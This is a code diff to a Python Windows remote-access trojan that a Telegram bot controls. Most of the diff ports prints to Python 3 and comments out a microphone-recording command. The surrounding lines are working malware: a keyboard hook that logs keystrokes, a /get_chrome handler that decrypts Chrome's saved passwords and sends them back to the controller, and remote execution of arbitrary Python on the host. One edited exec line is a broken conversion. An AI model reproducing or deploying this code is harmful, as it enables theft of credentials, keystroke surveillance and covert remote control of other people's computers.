@@ -11,6 +11,7 @@ from win32com.client import Dispatch					# WScript.Shell
 from time import strftime, sleep
 from subprocess import Popen, PIPE						# /cmd_exec					
 import psutil											# updating	
+import shutil
 import win32clipboard                                   # register clipboard    
 import sqlite3											# get chrome passwords
 import win32crypt										# get chrome passwords
@@ -19,7 +20,7 @@ import datetime											# /schedule
 import time
 import threading 										# /proxy, /schedule
 import proxy
-import pyaudio, wave 									# /hear
+#import pyaudio, wave 									# /hear
 import telepot, requests 								# telepot => telegram, requests => file download
 from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
 import os, os.path, platform, ctypes
@@ -32,11 +33,11 @@ import urllib# wallpaper
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
-token = os.environ['RAT_TOKEN'] 						# you can set your environment variable as well
+token = 'xxxx:xxxx' # you can set your environment variable as well
 # This will be used for setting paths and related file io -- change to whatever you want
-app_name = 'Portal'
+app_name = 'APP NAME'
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
-known_ids = []
+known_ids = ['123']
 #known_ids.append(os.environ['TELEGRAM_CHAT_ID']if 'TELEGRAM_CHAT_ID' in os.environ) 		# make sure to remove this line if you don't have this environment variable
 appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
 														# HIDING OPTIONS
@@ -138,7 +139,7 @@ def pressed_chars(event):
 		else:
 			tofile = event.GetKey()
 		if tofile == '<Return>':
-			print tofile
+			print(tofile)
 		else:
 			stdout.write(tofile)
 		f.write(tofile)
@@ -196,17 +197,17 @@ def split_string(n, st):
 def send_safe_message(bot, chat_id, message):
 	while(True):
 		try:
-			print bot.sendMessage(chat_id, message)
+			print(bot.sendMessage(chat_id, message))
 			break
 		except:
 			pass
 	
 def handle(msg):
-	chat_id = msg['chat']['id']
+        chat_id = msg['chat']['id']
         if checkchat_id(chat_id):
                 response = ''
                 if 'text' in msg:
-                        print '\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n'
+                        print('\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n')
                         command = msg['text']
                         if command == '/arp':
                                 response = ''
@@ -293,8 +294,8 @@ def handle(msg):
                                 command = command.strip()
                                 if len(command) > 0:
                                         try:
-                                                file1 = command.split('"')[1];
-                                                file2 = command.split('"')[3];
+                                                file1 = command.split('"')[1]
+                                                file2 = command.split('"')[3]
                                                 copyfile(file1, file2)
                                                 response = 'Files copied succesfully.'
                                         except Exception as e:
@@ -322,10 +323,6 @@ def handle(msg):
                                 else:
                                         response += 'enabled'
                         elif command == '/get_chrome':
-                                # """
-                                __author__ = "Matan"
-                                __version__ = "1.0.0"
-                                __maintainer__ = "http://www.hackil.co.il"
                                 con = sqlite3.connect(os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
                                 cursor = con.cursor()
                                 cursor.execute("SELECT origin_url,username_value,password_value from logins;")
@@ -335,40 +332,40 @@ def handle(msg):
                                         response += 'Password: ' + str(win32crypt.CryptUnprotectData(users[2], None, None, None, 0)) + '\n\n'
                                 # """
                                 # pass
-                        elif command.startswith('/hear'):
-                                SECONDS = -1
-                                try:
-                                        SECONDS = int(command.replace('/hear','').strip())
-                                except:
-                                        SECONDS = 5
-                                 
-                                CHANNELS = 2
-                                CHUNK = 1024
-                                FORMAT = pyaudio.paInt16
-                                RATE = 44100
-                                 
-                                audio = pyaudio.PyAudio()
-                                bot.sendChatAction(chat_id, 'typing')
-                                stream = audio.open(format=FORMAT, channels=CHANNELS,
-                                                                rate=RATE, input=True,
-                                                                frames_per_buffer=CHUNK)
-                                frames = []
-                                for i in range(0, int(RATE / CHUNK * SECONDS)):
-                                        data = stream.read(CHUNK)
-                                        frames.append(data)
-                                stream.stop_stream()
-                                stream.close()
-                                audio.terminate()
-                                
-                                wav_path = hide_folder + '\\mouthlogs.wav'
-                                waveFile = wave.open(wav_path, 'wb')
-                                waveFile.setnchannels(CHANNELS)
-                                waveFile.setsampwidth(audio.get_sample_size(FORMAT))
-                                waveFile.setframerate(RATE)
-                                waveFile.writeframes(b''.join(frames))
-                                waveFile.close()
-                                bot.sendChatAction(chat_id, 'upload_document')
-                                bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
+                        #elif command.startswith('/hear'):
+                        #        SECONDS = -1
+                        #        try:
+                        #                SECONDS = int(command.replace('/hear','').strip())
+                        #        except:
+                        #                SECONDS = 5
+                        #         
+                        #        CHANNELS = 2
+                        #        CHUNK = 1024
+                        #        FORMAT = pyaudio.paInt16
+                        #        RATE = 44100
+                        #         
+                        #        audio = pyaudio.PyAudio()
+                        #        bot.sendChatAction(chat_id, 'typing')
+                        #        stream = audio.open(format=FORMAT, channels=CHANNELS,
+                        #                                        rate=RATE, input=True,
+                        #                                        frames_per_buffer=CHUNK)
+                        #        frames = []
+                        #        for i in range(0, int(RATE / CHUNK * SECONDS)):
+                        #                data = stream.read(CHUNK)
+                         #               frames.append(data)
+                         #       stream.stop_stream()
+                        #        stream.close()
+                        #        audio.terminate()
+                        #        
+                         #       wav_path = hide_folder + '\\mouthlogs.wav'
+                        #        waveFile = wave.open(wav_path, 'wb')
+                        #        waveFile.setnchannels(CHANNELS)
+                        #        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
+                        #        waveFile.setframerate(RATE)
+                        #        waveFile.writeframes(b''.join(frames))
+                        #        waveFile.close()
+                        #        bot.sendChatAction(chat_id, 'upload_document')
+                        #        #bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
                         elif command == '/ip_info':
                                 bot.sendChatAction(chat_id, 'find_location')
                                 info = requests.get('http://ipinfo.io').text #json format
@@ -407,8 +404,8 @@ def handle(msg):
                                 command = command.replace('/mv', '')
                                 if len(command) > 0:
                                         try:
-                                                file1 = command.split('"')[1];
-                                                file2 = command.split('"')[3];
+                                                file1 = command.split('"')[1]
+                                                file2 = command.split('"')[3]
                                                 move(file1, file2)
                                                 response = 'Files moved succesfully.'
                                         except Exception as e:
@@ -456,7 +453,7 @@ def handle(msg):
                                         old_stdout = sys.stdout
                                         sys.stderr = mystderr = StringIO()
                                         sys.stdout = mystdout = StringIO()
-                                        exec command in globals()
+                                        exec(command in globals())
                                         if mystderr.getvalue() != None:
                                                 response += mystderr.getvalue()
                                         if mystdout.getvalue() != None:
@@ -622,8 +619,8 @@ if len(known_ids) > 0:
 	helloWorld = platform.uname()[1] + ": I'm up."
 	for known_id in known_ids:
 		send_safe_message(bot, known_id, helloWorld)
-	print helloWorld
-print 'Listening for commands on ' + platform.uname()[1] + '...'
+	print(helloWorld)
+print('Listening for commands on ' + platform.uname()[1] + '...')
 hookManager = pyHook.HookManager()
 hookManager.KeyDown = pressed_chars
 hookManager.HookKeyboard()
